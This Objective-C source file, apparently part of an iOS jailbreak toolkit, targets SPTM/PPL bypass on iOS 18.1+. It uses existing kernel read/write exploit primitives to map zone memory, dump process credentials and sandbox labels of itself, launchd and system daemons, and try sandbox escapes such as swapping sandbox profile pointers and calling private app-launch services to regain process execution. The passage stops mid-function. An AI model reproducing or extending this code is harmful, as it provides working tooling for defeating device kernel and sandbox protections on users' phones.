//
//  kernel_research.m
//  ClaudeFiles
//
//  Kernel research toolkit for SPTM bypass investigation on iOS 18.1+ A15.
//  Uses existing kread/kwrite primitives to map kernel state and test
//  indirect bypass vectors that avoid PPL/SPTM-protected memory.
//

#import "kernel_research.h"
#import "kexploit/krw.h"
#import "kexploit/kutils.h"
#import "kexploit/offsets.h"
#import "research/sandbox_research.h"
#import <stdlib.h>
#import <string.h>
#import <stdio.h>
#import <unistd.h>
#import <spawn.h>
#import <sys/wait.h>
#import <sys/stat.h>
#import <errno.h>
#import <dlfcn.h>
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <libkern/OSCacheControl.h>
#import <objc/runtime.h>
#import <fcntl.h>
#import <xpc/xpc.h>
#import "kexploit/sandbox.h"

// mach_vm.h is not available in iOS SDK.
// We resolve mach_vm_allocate/protect/deallocate via dlsym at runtime
// to avoid linker issues (symbols may not be in tbd stubs).

// sandbox_check and filter constants now provided by kexploit/sandbox.h

// ── Helpers ──

static char *g_buf = NULL;
static size_t g_buf_len = 0;
static size_t g_buf_cap = 0;

static void buf_init(void) {
    g_buf_cap = 8192;
    g_buf = (char *)malloc(g_buf_cap);
    g_buf[0] = '\0';
    g_buf_len = 0;
}

static void buf_append(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    char line[1024];
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);

    size_t line_len = strlen(line);
    if (g_buf_len + line_len + 1 > g_buf_cap) {
        g_buf_cap = (g_buf_len + line_len + 1) * 2;
        g_buf = (char *)realloc(g_buf, g_buf_cap);
    }
    memcpy(g_buf + g_buf_len, line, line_len + 1);
    g_buf_len += line_len;
}

static char *buf_finish(void) {
    char *result = g_buf;
    g_buf = NULL;
    g_buf_len = 0;
    g_buf_cap = 0;
    return result;
}

// ── Persistent breadcrumb logger ──
// Writes to Documents/breadcrumbs.log so logs survive crashes.
// Call bc_init() at start of any research function, bc() to log.
// kresearch_read_breadcrumbs() returns the file contents.

static FILE *g_bc_file = NULL;

static void bc_init(void) {
    @autoreleasepool {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
        // Truncate on each new run so we only have the latest
        g_bc_file = fopen([path UTF8String], "w");
        if (g_bc_file) {
            fprintf(g_bc_file, "[BC] breadcrumb log started\n");
            fflush(g_bc_file);
        }
    }
}

static void bc(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    char line[1024];
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);

    // Write to stderr (visible if attached)
    fprintf(stderr, "%s", line);

    // Write to persistent file (survives crash)
    if (g_bc_file) {
        fprintf(g_bc_file, "%s", line);
        fflush(g_bc_file);  // flush every line — crash safe
    }
}

static void bc_close(void) {
    if (g_bc_file) {
        fprintf(g_bc_file, "[BC] breadcrumb log complete\n");
        fclose(g_bc_file);
        g_bc_file = NULL;
    }
}

// Public API: read the last breadcrumbs from disk
char *kresearch_read_breadcrumbs(void) {
    @autoreleasepool {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"breadcrumbs.log"];
        NSData *data = [NSData dataWithContentsOfFile:path];
        if (!data || data.length == 0) {
            char *msg = strdup("(no breadcrumbs found — run a command first)");
            return msg;
        }
        char *result = (char *)malloc(data.length + 1);
        memcpy(result, data.bytes, data.length);
        result[data.length] = '\0';
        return result;
    }
}

// ── Zone metadata guard ──
// SPTM on A15+ unmaps zone metadata pages from kernel page tables.
// Reading them through our kread primitive causes Translation fault → panic.
// These globals hold the detected range; initial values from the last panic log.
// kresearch_detect_zones() can update them at runtime.
// Updated from panic log 2026-10-22: Metadata 0xffffffef48880000 - 0xffffffef4a080000
// Previous defaults (0xffffffee...) were ~4GB off due to KASLR, beyond 16MB margin.
static uint64_t g_zone_meta_min = 0xffffffef48880000ULL;
static uint64_t g_zone_meta_max = 0xffffffef4a080000ULL;
static bool     g_zone_meta_detected = false;

// Zone MAP bounds — where actual zone allocations (heap objects) live.
// Must be set by detect_zones before any write operations.
// Addresses outside this range are NOT valid heap memory and will fault.
static uint64_t g_zone_map_min = 0;
static uint64_t g_zone_map_max = 0;
static bool     g_zone_map_detected = false;

static bool is_zone_meta(uint64_t addr) {
    // Check if addr falls in the known zone metadata range (± 16 MB margin
    // to account for slight KASLR shifts between boots).
    if (g_zone_meta_min && g_zone_meta_max) {
        uint64_t margin = 0x1000000; // 16 MB
        uint64_t lo = (g_zone_meta_min > margin) ? g_zone_meta_min - margin : 0;
        uint64_t hi = g_zone_meta_max + margin;
        if (addr >= lo && addr <= hi) return true;
    }
    return false;
}

static bool kaddr_ok(uint64_t addr) {
    if (addr < VM_MIN_KERNEL_ADDRESS || addr > VM_MAX_KERNEL_ADDRESS) return false;
    if (is_zone_meta(addr)) return false;
    return true;
}

// Check if an address is in the kernelcache static region (SPTM read-only).
// Constant strings, vtables, and compiled code live here — writes will panic.
// The kernelcache base is around 0xfffffff03xxxxxxx after KASLR.
static bool is_kernel_static(uint64_t addr) {
    // Kernelcache sits in the 0xfffffff0... range (upper kernel VA space).
    // Zone heap sits in 0xffffffdc..0xffffffe2 range (lower kernel VA space).
    // Anything above 0xffffffec00000000 and with the 0xfffffff0 prefix
    // is almost certainly in the static kernelcache image.
    return (addr >= 0xffffffec00000000ULL && addr <= 0xfffffff7ffffffffULL);
}

// Stricter check for write targets: must be a valid kernel address,
// NOT in zone metadata, NOT in the kernelcache static region,
// AND must be within the zone map bounds (where heap allocations live).
// Zone map bounds must be set by detect_zones first — returns false if not.
static bool kaddr_writable(uint64_t addr) {
    if (!kaddr_ok(addr)) return false;
    if (is_kernel_static(addr)) return false;
    // CRITICAL: address must be within zone map (actual heap memory).
    // Without this check, addresses outside the zone map pass kaddr_ok()
    // but fault on access (Translation fault — page not even mapped).
    if (!g_zone_map_detected) return false;  // refuse writes until calibrated
    if (addr < g_zone_map_min || addr > g_zone_map_max) return false;
    return true;
}

// Stricter check for struct pointers: must be 8-byte aligned
static bool kptr_ok(uint64_t addr) {
    if (!kaddr_ok(addr)) return false;
    if (addr & 0x7) return false;  // kernel struct pointers are 8-byte aligned
    return true;
}

// Safest check for heap chain pointers: must be a valid struct pointer,
// within the calibrated zone map (actual mapped heap memory), AND
// aligned to the zone element granularity so kreadbuf won't cross a
// zone allocation boundary (iOS 18.1 panics on zone bound overflow).
//
// zone_align: minimum alignment for the struct being read (e.g. 0x20
//   for extension_class_node, 0x20 for extension).  Must be a power of 2.
//   Use 0 to skip the alignment check (falls back to 8-byte from kptr_ok).
static bool kptr_heap_ok_aligned(uint64_t addr, uint64_t zone_align) {
    if (!kptr_ok(addr)) return false;
    if (g_zone_map_detected) {
        if (addr < g_zone_map_min || addr > g_zone_map_max) return false;
    }
    if (zone_align > 8 && (addr & (zone_align - 1))) return false;
    return true;
}

// Default version with 0x20 (32-byte) zone alignment — good for
// extension_class_node (0x20 bytes, allocated in data.kalloc.32).
static bool kptr_heap_ok(uint64_t addr) {
    return kptr_heap_ok_aligned(addr, 0x20);
}

static void hexdump_buf(uint64_t kaddr, size_t len, const char *label) {
    buf_append("  %s @ 0x%llx (%zu bytes):\n", label, kaddr, len);
    uint8_t data[256];
    if (len > sizeof(data)) len = sizeof(data);
    kreadbuf(kaddr, data, len);
    for (size_t i = 0; i < len; i += 16) {
        buf_append("    %04zx: ", i);
        for (size_t j = 0; j < 16 && (i + j) < len; j++) {
            buf_append("%02x ", data[i + j]);
        }
        buf_append("\n");
    }
}

// Read a kernel C string (up to maxlen bytes)
static void kread_string(uint64_t kaddr, char *out, size_t maxlen) {
    if (!kaddr_ok(kaddr)) {
        snprintf(out, maxlen, "(invalid kaddr 0x%llx)", kaddr);
        return;
    }
    kreadbuf(kaddr, out, maxlen - 1);
    out[maxlen - 1] = '\0';
}

// ── Zone metadata detection ──

extern uint64_t g_kernel_base;
extern uint64_t g_kernel_slide;

// Silent helper: probes heap addresses, computes bounds, sets globals.
// Does NOT touch buf_* — safe to call from any context.
// Returns true if zone map bounds were successfully determined.
static bool calibrate_zone_bounds(void) {
    uint64_t self_proc = proc_self();
    if (!self_proc) return false;

    uint64_t proc_ro = kread_ptr(self_proc + off_proc_p_proc_ro);
    uint64_t ucred   = kread_ptr(proc_ro + off_proc_ro_p_ucred);
    uint64_t label   = kread_ptr(ucred + off_ucred_cr_label);
    uint64_t sbx     = kread_ptr(label + off_label_l_perpolicy_sandbox);

    // Collect ALL heap addresses we can find to determine zone map bounds
    uint64_t heap_addrs[64];
    int heap_count = 0;

    #define RECORD(a) do { if ((a) > VM_MIN_KERNEL_ADDRESS && heap_count < 64) \
        heap_addrs[heap_count++] = (a); } while(0)

    RECORD(self_proc);
    RECORD(proc_ro);
    RECORD(ucred);
    RECORD(label);
    RECORD(sbx);

    // Walk extension set for more heap addresses
    if (sbx) {
        struct sandbox_label sbx_lbl = {0};
        kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
        uint64_t ext_set = (uint64_t)sbx_lbl.extension_set;
        if (ext_set && kaddr_ok(ext_set)) {
            RECORD(ext_set);
            uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
            kreadbuf(ext_set, buckets, sizeof(buckets));
            for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
                if (buckets[i] && kptr_heap_ok(buckets[i])) {
                    RECORD(buckets[i]);
                    uint8_t cn_raw[0x20];
                    kreadbuf(buckets[i], cn_raw, 0x20);
                    uint64_t cn_ext = *(uint64_t *)(cn_raw + CN_OFF_EXT);
                    if (cn_ext && kptr_heap_ok_aligned(cn_ext, 0x20)) {
                        RECORD(cn_ext);
                        uint8_t eraw[EXT_RAW_SIZE];
                        kreadbuf(cn_ext, eraw, EXT_RAW_SIZE);
                        uint64_t data_ptr = *(uint64_t *)(eraw + EXT_OFF_DATA);
                        if (data_ptr && kaddr_ok(data_ptr)) {
                            RECORD(data_ptr);
                        }
                    }
                }
            }
        }
    }
    #undef RECORD

    // Also check PID 1 (launchd) for broader heap coverage
    uint64_t launchd = proc_find(1);
    if (launchd && kaddr_ok(launchd)) {
        if (heap_count < 64) heap_addrs[heap_count++] = launchd;
    }

    if (heap_count < 2) return false;

    // Sort and find min/max
    for (int i = 0; i < heap_count - 1; i++)
        for (int j = i + 1; j < heap_count; j++)
            if (heap_addrs[i] > heap_addrs[j]) {
                uint64_t t = heap_addrs[i];
                heap_addrs[i] = heap_addrs[j];
                heap_addrs[j] = t;
            }

    uint64_t observed_min = heap_addrs[0];
    uint64_t observed_max = heap_addrs[heap_count - 1];

    // Expand: 8 GB below min, 8 GB above max
    uint64_t expand = 0x200000000ULL;
    uint64_t map_min = (observed_min > expand) ? (observed_min - expand) : VM_MIN_KERNEL_ADDRESS;
    uint64_t map_max = observed_max + expand;
    if (map_max < observed_max) map_max = VM_MAX_KERNEL_ADDRESS;

    // Try to refine zone_meta from bucket walk
    uint64_t meta_candidates[32];
    int meta_count = 0;
    if (sbx) {
        struct sandbox_label sbx_lbl2 = {0};
        kreadbuf(sbx, &sbx_lbl2, sizeof(struct sandbox_label));
        uint64_t ext_set = (uint64_t)sbx_lbl2.extension_set;
        if (ext_set && kaddr_ok(ext_set)) {
            uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
            kreadbuf(ext_set, buckets, sizeof(buckets));
            for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
                if (buckets[i] && !kptr_ok(buckets[i]) && !is_kernel_static(buckets[i])) {
                    if (meta_count < 32) meta_candidates[meta_count++] = buckets[i];
                }
            }
        }
    }

    if (meta_count > 0) {
        uint64_t meta_lo = meta_candidates[0], meta_hi = meta_candidates[0];
        for (int i = 1; i < meta_count; i++) {
            if (meta_candidates[i] < meta_lo) meta_lo = meta_candidates[i];
            if (meta_candidates[i] > meta_hi) meta_hi = meta_candidates[i];
        }
        uint64_t meta_margin = 0x2000000ULL;
        meta_lo = (meta_lo > meta_margin) ? meta_lo - meta_margin : 0;
        meta_hi += meta_margin;
        g_zone_meta_min = meta_lo;
        g_zone_meta_max = meta_hi;
        g_zone_meta_detected = true;
    }

    // Apply zone map bounds
    g_zone_map_min = map_min;
    g_zone_map_max = map_max;
    g_zone_map_detected = true;
    return true;
}

char *kresearch_detect_zones(void) {
    buf_init();
    buf_append("=== ZONE RANGE DETECTION ===\n\n");
    buf_append("Detects zone MAP bounds (where heap objects live) and zone\n");
    buf_append("METADATA bounds (unmapped by SPTM — reads/writes panic).\n\n");

    buf_append("kernel_base:  0x%llx\n", g_kernel_base);
    buf_append("kernel_slide: 0x%llx\n\n", g_kernel_slide);

    buf_append("Before calibration:\n");
    buf_append("  zone_meta: 0x%llx - 0x%llx  detected=%s\n",
               g_zone_meta_min, g_zone_meta_max,
               g_zone_meta_detected ? "YES" : "NO (stale defaults)");
    buf_append("  zone_map:  0x%llx - 0x%llx  detected=%s\n\n",
               g_zone_map_min, g_zone_map_max,
               g_zone_map_detected ? "YES" : "NO (writes blocked)");

    buf_append("Probing heap addresses...\n");
    bool ok = calibrate_zone_bounds();
    if (!ok) {
        buf_append("FAILED: could not determine zone map bounds.\n");
        return buf_finish();
    }

    buf_append("\n=== APPLIED ===\n");
    buf_append("zone_map:  0x%llx - 0x%llx  (writes now allowed in this range)\n",
               g_zone_map_min, g_zone_map_max);
    buf_append("zone_meta: 0x%llx - 0x%llx  (reads/writes blocked in this range)\n",
               g_zone_meta_min, g_zone_meta_max);
    buf_append("\nkaddr_writable() now requires: in zone_map AND NOT in zone_meta AND NOT kernel_static\n");
    buf_append("patch_exec is safe to run.\n");

    return buf_finish();
}

char *kresearch_set_zone_meta(uint64_t min_addr, uint64_t max_addr) {
    buf_init();
    buf_append("=== SET ZONE METADATA RANGE ===\n\n");
    buf_append("Old: 0x%llx - 0x%llx\n", g_zone_meta_min, g_zone_meta_max);
    g_zone_meta_min = min_addr;
    g_zone_meta_max = max_addr;
    g_zone_meta_detected = true;
    buf_append("New: 0x%llx - 0x%llx\n", g_zone_meta_min, g_zone_meta_max);
    buf_append("Detection: MANUAL\n");
    buf_append("\nAll kaddr_ok/kptr_ok checks now exclude this range (± 16 MB margin).\n");
    return buf_finish();
}

// ── Credential dumping ──

typedef struct {
    uint64_t proc;
    uint64_t proc_ro;
    uint64_t ucred;
    uint64_t task;
    uint64_t label;
    uint64_t sandbox;
    uint64_t sandbox_profile;
    uint64_t extension_set;
    uint32_t uid, ruid, svuid;
    uint32_t gid, rgid, svgid;
    uint32_t p_flag;
    uint32_t cs_flags;  // from csblob if accessible
    char p_name[32];
    pid_t pid;
} proc_info_t;

static int gather_proc_info(uint64_t proc, proc_info_t *info) {
    memset(info, 0, sizeof(*info));
    info->proc = proc;

    if (!proc || !kaddr_ok(proc)) return -1;

    info->pid = (pid_t)kread32(proc + off_proc_p_pid);
    kreadbuf(proc + off_proc_p_name, info->p_name, 31);
    info->p_flag = kread32(proc + off_proc_p_flag);

    // proc_ro
    info->proc_ro = kread_ptr(proc + off_proc_p_proc_ro);
    if (!kaddr_ok(info->proc_ro)) return -1;

    // task
    info->task = kread_ptr(info->proc_ro + off_proc_ro_pr_task);

    // ucred (PPL-protected, but we can READ)
    info->ucred = kread_ptr(info->proc_ro + off_proc_ro_p_ucred);
    if (!kaddr_ok(info->ucred)) return -1;

    // Read credential fields
    info->uid   = kread32(info->ucred + 0x18);  // cr_uid
    info->ruid  = kread32(info->ucred + 0x1c);  // cr_ruid
    info->svuid = kread32(info->ucred + 0x20);  // cr_svuid
    info->rgid  = kread32(info->ucred + 0x68);  // cr_rgid
    info->svgid = kread32(info->ucred + 0x6c);  // cr_svgid

    // Label → sandbox
    info->label = kread_ptr(info->ucred + off_ucred_cr_label);
    if (kaddr_ok(info->label)) {
        info->sandbox = kread_ptr(info->label + off_label_l_perpolicy_sandbox);
        if (kaddr_ok(info->sandbox)) {
            // sandbox_label layout (verified against sandbox_escape.m):
            //   0x00: profile/platform_profile
            //   0x08: unknown (often 0)
            //   0x10: extension_set  (OFF_SANDBOX_EXT_SET in sandbox_escape.m)
            //   0x18: unknown
            info->sandbox_profile = kread_ptr(info->sandbox + 0x00);
            info->extension_set = kread_ptr(info->sandbox + 0x10);  // was 0x08, WRONG
        }
    }

    // Try to read cs_flags from csblob chain
    uint64_t textvp = kread_ptr(proc + off_proc_p_textvp);
    if (kaddr_ok(textvp)) {
        uint64_t ubcinfo = kread_ptr(textvp + 0x78);
        if (kaddr_ok(ubcinfo)) {
            uint64_t csblob = kread_ptr(ubcinfo + 0x50);
            if (kaddr_ok(csblob)) {
                info->cs_flags = kread32(csblob + 0xC);
            }
        }
    }

    return 0;
}

static void dump_proc_info(proc_info_t *info) {
    buf_append("  PID: %d  Name: %s\n", info->pid, info->p_name);
    buf_append("  proc:     0x%llx\n", info->proc);
    buf_append("  proc_ro:  0x%llx  (PPL-protected)\n", info->proc_ro);
    buf_append("  task:     0x%llx\n", info->task);
    buf_append("  ucred:    0x%llx  (PPL-protected)\n", info->ucred);
    buf_append("  UID: %u  RUID: %u  SVUID: %u\n", info->uid, info->ruid, info->svuid);
    buf_append("  RGID: %u  SVGID: %u\n", info->rgid, info->svgid);
    buf_append("  p_flag:   0x%08x", info->p_flag);
    if (info->p_flag & 0x400) buf_append(" [P_PLATFORM]");
    buf_append("\n");
    buf_append("  cs_flags: 0x%08x", info->cs_flags);
    if (info->cs_flags & 0x1)       buf_append(" [CS_VALID]");
    if (info->cs_flags & 0x4)       buf_append(" [CS_GET_TASK_ALLOW]");
    if (info->cs_flags & 0x8)       buf_append(" [CS_INSTALLER]");
    if (info->cs_flags & 0x20000)   buf_append(" [CS_SIGNED]");
    if (info->cs_flags & 0x4000000) buf_append(" [CS_PLATFORM_BINARY]");
    buf_append("\n");
    buf_append("  label:    0x%llx\n", info->label);
    buf_append("  sandbox:  0x%llx\n", info->sandbox);
    buf_append("  profile:  0x%llx  (sandbox profile ptr — in WRITABLE memory)\n", info->sandbox_profile);
    buf_append("  ext_set:  0x%llx  (extension set — in WRITABLE memory)\n", info->extension_set);
}

// ── Public API ──

char *kresearch_dump_self(void) {
    buf_init();
    buf_append("=== SELF PROCESS STATE ===\n");

    uint64_t self_proc = proc_self();
    proc_info_t info;
    if (gather_proc_info(self_proc, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info\n");
        return buf_finish();
    }
    dump_proc_info(&info);

    // Dump raw sandbox_label
    if (kaddr_ok(info.sandbox)) {
        hexdump_buf(info.sandbox, 0x40, "sandbox_label raw");
    }

    // Dump extension_set buckets
    if (kaddr_ok(info.extension_set)) {
        buf_append("\n  Extension set buckets:\n");
        for (int i = 0; i < 9; i++) {
            uint64_t bucket = kread_ptr(info.extension_set + (i * 8));
            if (bucket && kaddr_ok(bucket)) {
                // Read class node fields using raw kread (avoids pointer cast issues)
                uint64_t class_name_ptr = kread_ptr(bucket + 0x00);
                uint64_t node_count     = kread64(bucket + 0x18);
                char name[128] = {0};
                if (kaddr_ok(class_name_ptr)) {
                    kreadbuf(class_name_ptr, name, sizeof(name) - 1);
                }
                buf_append("    [%d] 0x%llx -> class: \"%s\" (count: %llu)\n",
                           i, bucket, name, (unsigned long long)node_count);
            }
        }
    }

    return buf_finish();
}

char *kresearch_dump_proc(int pid) {
    buf_init();
    buf_append("=== PROCESS %d STATE ===\n", pid);

    uint64_t target = proc_find((pid_t)pid);
    if (!target || !kaddr_ok(target)) {
        buf_append("ERROR: Could not find proc for PID %d\n", pid);
        return buf_finish();
    }

    proc_info_t info;
    if (gather_proc_info(target, &info) != 0) {
        buf_append("ERROR: Failed to gather proc info for PID %d\n", pid);
        return buf_finish();
    }
    dump_proc_info(&info);

    return buf_finish();
}

char *kresearch_compare_creds(int target_pid) {
    buf_init();
    buf_append("=== CREDENTIAL COMPARISON: self vs PID %d ===\n\n", target_pid);

    // Gather self
    proc_info_t self_info;
    if (gather_proc_info(proc_self(), &self_info) != 0) {
        buf_append("ERROR: Failed to gather self proc info\n");
        return buf_finish();
    }

    // Gather target
    uint64_t target_proc = proc_find((pid_t)target_pid);
    if (!target_proc || !kaddr_ok(target_proc)) {
        buf_append("ERROR: Could not find PID %d\n", target_pid);
        return buf_finish();
    }
    proc_info_t target_info;
    if (gather_proc_info(target_proc, &target_info) != 0) {
        buf_append("ERROR: Failed to gather target proc info\n");
        return buf_finish();
    }

    buf_append("--- SELF (PID %d, %s) ---\n", self_info.pid, self_info.p_name);
    dump_proc_info(&self_info);
    buf_append("\n--- TARGET (PID %d, %s) ---\n", target_info.pid, target_info.p_name);
    dump_proc_info(&target_info);

    buf_append("\n--- KEY DIFFERENCES ---\n");

    if (self_info.uid != target_info.uid)
        buf_append("  UID: self=%u target=%u  ← PPL-protected, cannot change\n",
                   self_info.uid, target_info.uid);

    if (self_info.p_flag != target_info.p_flag)
        buf_append("  p_flag: self=0x%x target=0x%x  ← WRITABLE (in proc, not proc_ro)\n",
                   self_info.p_flag, target_info.p_flag);

    if (self_info.cs_flags != target_info.cs_flags)
        buf_append("  cs_flags: self=0x%x target=0x%x  ← in csblob, may be PPL-protected\n",
                   self_info.cs_flags, target_info.cs_flags);

    if (self_info.sandbox_profile != target_info.sandbox_profile)
        buf_append("  sandbox_profile: self=0x%llx target=0x%llx  ← WRITABLE (in sandbox_label)\n",
                   self_info.sandbox_profile, target_info.sandbox_profile);

    if (self_info.extension_set != target_info.extension_set)
        buf_append("  extension_set: self=0x%llx target=0x%llx  ← WRITABLE\n",
                   self_info.extension_set, target_info.extension_set);

    // Check if sandbox objects are the same pointer (some daemons share)
    if (self_info.sandbox == 0 && target_info.sandbox == 0)
        buf_append("  NOTE: Both have NULL sandbox — no sandbox applied\n");
    else if (target_info.sandbox == 0)
        buf_append("  NOTE: Target has NO sandbox! We do.\n");

    return buf_finish();
}

char *kresearch_check_sandbox_ops(void) {
    buf_init();
    buf_append("=== SANDBOX OPERATION CHECK ===\n");
    pid_t pid = getpid();
    buf_append("PID: %d\n\n", pid);

    struct {
        const char *op;
        int filter;
        const char *arg;
        const char *category;
    } checks[] = {
        // Filesystem (should be allowed after sandbox escape)
        {"file-read-data",    SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/",           "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-write-data",   SANDBOX_FILTER_PATH, "/private/var", "filesystem"},
        {"file-read-data",    SANDBOX_FILTER_PATH, "/bin/sh",     "filesystem"},

        // Process operations (likely blocked — key for posix_spawn)
        {"process-exec",      SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-exec",      SANDBOX_FILTER_PATH, "/usr/bin/env", "process"},
        {"process-exec*",     SANDBOX_FILTER_PATH, "/bin/sh",     "process"},
        {"process-fork",      SANDBOX_FILTER_NONE, NULL,          "process"},

        // Mach/IPC
        {"mach-lookup",       SANDBOX_FILTER_NONE, NULL,          "mach"},

        // Signal
        {"signal",            SANDBOX_FILTER_NONE, NULL,          "signal"},

        // Sysctl
        {"sysctl-read",       SANDBOX_FILTER_NONE, NULL,          "sysctl"},
        {"sysctl-write",      SANDBOX_FILTER_NONE, NULL,          "sysctl"},
    };

    int n = sizeof(checks) / sizeof(checks[0]);
    for (int i = 0; i < n; i++) {
        int result;
        if (checks[i].arg) {
            result = sandbox_check(pid, checks[i].op,
                                   checks[i].filter | SANDBOX_CHECK_NO_REPORT,
                                   checks[i].arg);
        } else {
            result = sandbox_check(pid, checks[i].op,
                                   SANDBOX_CHECK_NO_REPORT);
        }

        const char *status = (result == 0) ? "ALLOWED" : "BLOCKED";
        if (checks[i].arg) {
            buf_append("  [%s] %-7s  %s %s\n", status,
                       checks[i].category, checks[i].op, checks[i].arg);
        } else {
            buf_append("  [%s] %-7s  %s\n", status,
                       checks[i].category, checks[i].op);
        }
    }

    buf_append("\nNOTE: 'process-exec' and 'process-fork' are the key checks for posix_spawn.\n");
    buf_append("If blocked, we need to either:\n");
    buf_append("  1. Swap sandbox profile pointer (writable in sandbox_label)\n");
    buf_append("  2. Add process-exec extensions (like we do for file-read-write)\n");
    buf_append("  3. Clear/modify sandbox_label.platform_profile\n");

    return buf_finish();
}

char *kresearch_dump_sandbox_profile(void) {
    buf_init();
    buf_append("=== SANDBOX PROFILE ANALYSIS ===\n\n");

    // Our sandbox
    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    buf_append("--- OUR SANDBOX ---\n");
    if (!kaddr_ok(self_info.sandbox)) {
        buf_append("  No sandbox object found!\n");
        return buf_finish();
    }

    hexdump_buf(self_info.sandbox, 0x80, "sandbox_label full dump");

    buf_append("\n  Profile pointer: 0x%llx\n", self_info.sandbox_profile);
    if (kaddr_ok(self_info.sandbox_profile)) {
        hexdump_buf(self_info.sandbox_profile, 0x40, "profile object (first 64 bytes)");

        // Try to read profile name/type if it has one
        // Sandbox profiles typically have a name string pointer near the start
        uint64_t maybe_name = kread_ptr(self_info.sandbox_profile);
        if (kaddr_ok(maybe_name)) {
            char name[128] = {0};
            kreadbuf(maybe_name, name, sizeof(name) - 1);
            // Check if it looks like ASCII
            bool is_ascii = true;
            for (int i = 0; i < 64 && name[i]; i++) {
                if (name[i] < 0x20 || name[i] > 0x7e) { is_ascii = false; break; }
            }
            if (is_ascii && name[0])
                buf_append("  Profile name (maybe): \"%s\"\n", name);
        }
    }

    // Compare with launchd (PID 1)
    uint64_t launchd_proc = proc_find(1);
    if (kaddr_ok(launchd_proc)) {
        proc_info_t launchd_info;
        gather_proc_info(launchd_proc, &launchd_info);

        buf_append("\n--- LAUNCHD (PID 1) SANDBOX ---\n");
        if (kaddr_ok(launchd_info.sandbox)) {
            hexdump_buf(launchd_info.sandbox, 0x80, "launchd sandbox_label");
            buf_append("  Profile pointer: 0x%llx\n", launchd_info.sandbox_profile);
        } else {
            buf_append("  launchd sandbox ptr: 0x%llx (NULL/invalid → NO sandbox!)\n",
                       launchd_info.sandbox);
        }

        if (self_info.sandbox_profile == launchd_info.sandbox_profile) {
            buf_append("\n  SAME profile pointer — profiles already match\n");
        } else {
            buf_append("\n  DIFFERENT profile pointers:\n");
            buf_append("    self:    0x%llx\n", self_info.sandbox_profile);
            buf_append("    launchd: 0x%llx\n", launchd_info.sandbox_profile);
            buf_append("    → Swapping could unlock process-exec\n");
        }
    }

    // Also check a few system daemons
    const char *daemons[] = {"SpringBoard", "backboardd", "logd", NULL};
    for (int i = 0; daemons[i]; i++) {
        uint64_t dp = proc_find_by_name(daemons[i]);
        if (dp && kaddr_ok(dp)) {
            proc_info_t di;
            gather_proc_info(dp, &di);
            buf_append("\n  %s (PID %d): sandbox=0x%llx profile=0x%llx uid=%u\n",
                       daemons[i], di.pid, di.sandbox, di.sandbox_profile, di.uid);
        }
    }

    return buf_finish();
}

char *kresearch_swap_sandbox_profile(void) {
    bc_init();
    bc("[SWAP] v14 starting\n");
    buf_init();
    buf_append("=== EXEC BYPASS v14 - ALTERNATIVE LAUNCH VECTORS ===\n");
    buf_append("v13 confirmed:\n");
    buf_append("  registerApplicationDictionary: SILENTLY FAILS (nil)\n");
    buf_append("  registerApplication: SILENTLY FAILS (nil)\n");
    buf_append("  applicationIsInstalled(fake): NO — not accepted\n");
    buf_append("  FBSSystemService.createClientPort: nil from sandbox\n");
    buf_append("  NSTask -launch /bin/sh: 'path not accessible'\n");
    buf_append("v14: FBSOpenApp service, NSTask w/ own binary, SBS C funcs,\n");
    buf_append("  openURL vector, BKSSystemService, kernel sandbox ext.\n\n");

    // Load frameworks once
    void *fbs = dlopen("/System/Library/PrivateFrameworks/"
        "FrontBoardServices.framework/FrontBoardServices", RTLD_LAZY);
    void *bks = dlopen("/System/Library/PrivateFrameworks/"
        "BackBoardServices.framework/BackBoardServices", RTLD_LAZY);
    void *sbs = dlopen("/System/Library/PrivateFrameworks/"
        "SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
    void *ls = dlopen("/System/Library/PrivateFrameworks/"
        "MobileCoreServices.framework/MobileCoreServices", RTLD_LAZY);
    if (!ls) ls = dlopen("/System/Library/Frameworks/"
        "CoreServices.framework/CoreServices", RTLD_LAZY);

    buf_append("Frameworks: FBS=%p BKS=%p SBS=%p LS=%p\n",
        fbs, bks, sbs, ls);

    // ══════════════════════════════════════════════════════════════
    // TEST A: FBSOpenApplicationService — try to get a service
    // handle via class methods and call openApplication directly.
    // v13 showed the class exists with serviceWithDefaultShellEndpoint
    // and other class methods. Try them.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test A: FBSOpenApplicationService\n");
    buf_append("\n-- Test A: FBSOpenApplicationService --\n");
    {
        Class fbsOpenClass = NSClassFromString(
            @"FBSOpenApplicationService");
        buf_append("  class: %p\n", fbsOpenClass);

        if (fbsOpenClass) {
            // A1: Try serviceWithDefaultShellEndpoint
            bc("[SWAP] A1: serviceWithDefaultShellEndpoint\n");
            buf_append("\n  A1: serviceWithDefaultShellEndpoint\n");
            SEL defShellSel = NSSelectorFromString(
                @"serviceWithDefaultShellEndpoint");
            if ([fbsOpenClass respondsToSelector:defShellSel]) {
                @try {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    id svc = [fbsOpenClass performSelector:defShellSel];
#pragma clang diagnostic pop
                    buf_append("  service: %s\n",
                        svc ? [[svc description] UTF8String] : "nil");

                    if (svc) {
                        // Try canOpenApplication:reason:
                        SEL canOpenSel = NSSelectorFromString(
                            @"canOpenApplication:reason:");
                        buf_append("  canOpenApplication: %s\n",
